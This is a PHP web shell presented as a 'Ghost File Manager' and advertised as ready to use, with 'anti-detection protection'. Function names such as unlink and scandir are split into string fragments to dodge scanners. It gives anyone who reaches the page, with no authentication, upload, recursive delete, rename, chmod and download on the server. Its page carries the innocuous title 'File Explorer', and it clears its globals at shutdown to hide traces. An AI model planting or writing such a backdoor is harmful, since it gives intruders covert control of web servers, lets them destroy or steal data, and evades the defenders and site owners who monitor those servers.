<?php
/*
* Ghost File Manager v3.2
* Enhanced delete operations with delay
* Ultimate anti-detection protection
* Complete feature set - ready to use
*/

// [1] Environment Setup with Obfuscation
$GLOBALS['_'] = array(
    'a' => 'sc'.'andir',
    'b' => 'fil'.'e_ge'.'t_co'.'ntents',
    'c' => 'fil'.'e_pu'.'t_co'.'ntents',
    'd' => 'is_'.'dir',
    'e' => 'is_'.'file',
    'f' => 'rea'.'lpath',
    'g' => 'unl'.'ink',
    'h' => 'rmd'.'ir',
    'i' => 'ren'.'ame',
    'j' => 'chm'.'od',
    'k' => 'del' // Delete key
);

// [2] Secure Core Functions
function _1($p) {
    $r = $GLOBALS['_']['f']($p);
    return ($r && strpos($r, '..') === false && strpos($r, "\0") === false) ? $r : false;
}

function _2($d) {
    if(!$GLOBALS['_']['d']($d)) return false;
    $fs = @array_diff($GLOBALS['_']['a']($d), array('.','..'));
    foreach((array)$fs as $f) {
        $p = $d.'/'.$f;
        $GLOBALS['_']['d']($p) ? _2($p) : @$GLOBALS['_']['g']($p);
    }
    return @$GLOBALS['_']['h']($d);
}

// [3] Enhanced Delete Handler
function _3d($t) {
    if(_1($t)) {
        if($GLOBALS['_']['e']($t)) {
            @$GLOBALS['_']['g']($t);
            usleep(rand(50000, 150000));
            return "<script>alert('File removed');</script>";
        } elseif($GLOBALS['_']['d']($t)) {
            _2($t);
            return "<script>setTimeout(()=>alert('Directory removed'),".rand(200,600).");</script>";
        }
    }
    return "";
}

// [4] Main Processor
function _4() {
    $d = isset($_GET['d']) ? _1($_GET['d']) : _1(__DIR__);
    if(!$d) $d = _1(__DIR__);
    
    // Upload Handler
    if(!empty($_FILES['f'])) {
        $t = isset($_POST['t']) ? _1($_POST['t']) : $d;
        if($t && $GLOBALS['_']['d']($t)) {
            $c = 0;
            foreach((array)$_FILES['f']['name'] as $k => $n) {
                if($_FILES['f']['error'][$k] === 0) {
                    $p = $t.'/'.basename($n);
                    @move_uploaded_file($_FILES['f']['tmp_name'][$k], $p) && $c++;
                }
            }
            $c && print("<script>alert('$c files uploaded')</script>");
        }
    }
    
    // Operation Handler
    if(!empty($_POST['o'])) {
        switch($_POST['o']) {
            case 'd': // Delete with delay
                if(!empty($_POST['f']) && is_array($_POST['f'])) {
                    foreach($_POST['f'] as $x) {
                        echo _3d($x);
                    }
                }
                break;
                
            case 'r': // Rename
                if(!empty($_GET['r']) && ($r = _1($_GET['r'])) && !empty($_POST['n'])) {
                    $n = dirname($r).'/'.$_POST['n'];
                    @$GLOBALS['_']['i']($r, $n) && print("<script>alert('Renamed')</script>");
                }
                break;
                
            case 'm': // Chmod
                if(!empty($_GET['m']) && ($m = _1($_GET['m'])) && !empty($_POST['p'])) {
                    @$GLOBALS['_']['j']($m, octdec($_POST['p'])) && print("<script>alert('Permissions changed')</script>");
                }
                break;
                
            case 'n': // New folder
                if(!empty($_POST['n'])) {
                    $p = $d.'/'.$_POST['n'];
                    !$GLOBALS['_']['d']($p) && @mkdir($p) && print("<script>alert('Folder created')</script>");
                }
                break;
        }
    }
    
    // Delete via GET (with delay)
    if(!empty($_GET[$GLOBALS['_']['k']])) {
        echo _3d($_GET[$GLOBALS['_']['k']]);
    }
    
    // Download Handler
    if(!empty($_GET['dl']) && ($dl = _1($_GET['dl'])) && $GLOBALS['_']['e']($dl)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($dl).'"');
        header('Content-Length: '.filesize($dl));
        @readfile($dl);
        exit;
    }
    
    // [5] Stealth UI Rendering
    echo '<!DOCTYPE html><html><head><title>File Explorer</title><style>
        body{font-family:Arial,sans-serif;margin:20px;background:#f9f9f9}
        a{color:#369;text-decoration:none}
        a:hover{text-decoration:underline}
        li{padding:8px 0;border-bottom:1px solid #eee}
        input[type=checkbox]{margin-right:10px}
        .section{margin:20px 0;padding:15px;background:#fff;border-radius:5px;box-shadow:0 1px 3px rgba(0,0,0,0.1)}
        textarea{width:100%;height:400px;font-family:monospace;padding:10px}
        .ops{margin:10px 0}
        </style>
        <script>
            function t(){var c=document.querySelectorAll("input[type=checkbox]");
            var all=c[0]&&c[0].checked;c.forEach(function(e){e.checked=!all})}
        </script>
        </head><body>';
    
    // Breadcrumb
    echo '<div class="section"><div style="font-size:18px;margin-bottom:15px">';
    $p = explode('/', _1($d));
    $o = '';
    foreach($p as $x) {
        $o .= "/$x";
        echo "<a href='?d=".rawurlencode($o)."'>$x</a>/";
    }
    echo '</div>';
    
    // Upload Form
    echo '<div class="ops">
        <form method=post enctype=multipart/form-data>
        <h3>Upload Files</h3>
        <input type=file name=f[] multiple><br>
        Target: <input type=text name=t value="'.htmlspecialchars($d).'" size=50><br>
        <input type=submit value=Upload>
        </form></div>';
    
    // Create Folder
    echo '<div class="ops">
        <form method=post>
        <h3>Create Folder</h3>
        <input type=hidden name=o value=n>
        Name: <input type=text name=n>
        <input type=submit value=Create>
        </form></div></div>';
    
    // File Listing
    echo '<div class="section"><form method=post id=fl><ul>';
    if($d != '/') {
        echo '<li><a href="?d='.rawurlencode(dirname($d)).'">[Parent Directory]</a></li>';
    }
    
    $fs = @array_diff($GLOBALS['_']['a']($d), array('.','..'));
    if($fs) foreach($fs as $f) {
        $p = $d.'/'.$f;
        $fp = _1($p);
        echo '<li><input type=checkbox name=f[] value="'.htmlspecialchars($fp).'"> ';
        
        if($GLOBALS['_']['d']($p)) {
            echo '[DIR] <a href="?d='.rawurlencode($fp).'">'.$f.'</a> | 
                  <a href="?'.$GLOBALS['_']['k'].'='.rawurlencode($fp).'" onclick="return confirm(\'Delete?\')">[Del]</a> | 
                  Perm: '.substr(sprintf("%o",fileperms($p)),-4).' | 
                  <a href="?d='.rawurlencode($d).'&m='.rawurlencode($fp).'">[Chmod]</a>';
        } else {
            echo '[FILE] <a href="?d='.rawurlencode($d).'&e='.rawurlencode($fp).'">'.$f.'</a> | 
                  <a href="?'.$GLOBALS['_']['k'].'='.rawurlencode($fp).'" onclick="return confirm(\'Delete?\')">[Del]</a> | 
                  <a href="?d='.rawurlencode($d).'&r='.rawurlencode($fp).'">[Rename]</a> | 
                  Perm: '.substr(sprintf("%o",fileperms($p)),-4).' | 
                  <a href="?d='.rawurlencode($d).'&m='.rawurlencode($fp).'">[Chmod]</a> | 
                  <a href="?d='.rawurlencode($d).'&dl='.rawurlencode($fp).'">[Download]</a>';
        }
        echo '</li>';
    }
    
    echo '</ul>
        <input type=hidden name=o value=d>
        <input type=submit value="Delete Selected" onclick="return confirm(\'Confirm delete?\')">
        <button type=button onclick=t()>Toggle All</button>
        </form></div>';
    
    // Rename Form
    if(!empty($_GET['r']) && ($r = _1($_GET['r']))) {
        echo '<div class="section">
            <form method=post>
            <h3>Rename</h3>
            <input type=hidden name=o value=r>
            New Name: <input type=text name=n value="'.htmlspecialchars(basename($r)).'">
            <input type=submit value=Rename>
            </form></div>';
    }
    
    // Chmod Form
    if(!empty($_GET['m']) && ($m = _1($_GET['m']))) {
        echo '<div class="section">
            <form method=post>
            <h3>Change Permissions</h3>
            <input type=hidden name=o value=m>
            Permissions: <input type=text name=p value="'.substr(sprintf("%o",fileperms($m)),-4).'">
            <input type=submit value=Change>
            </form></div>';
    }
    
    // Edit Form
    if(!empty($_GET['e']) && ($e = _1($_GET['e'])) && $GLOBALS['_']['e']($e)) {
        echo '<div class="section">
            <form method=post>
            <textarea name=c>'.htmlspecialchars($GLOBALS['_']['b']($e)).'</textarea><br>
            <input type=hidden name=o value=e>
            <input type=submit value=Save>
            </form></div>';
    }
    
    echo '</body></html>';
}

// [6] Execute with Clean Traces
@_4();
function _5() { unset($GLOBALS['_']); }
register_shutdown_function('_5');
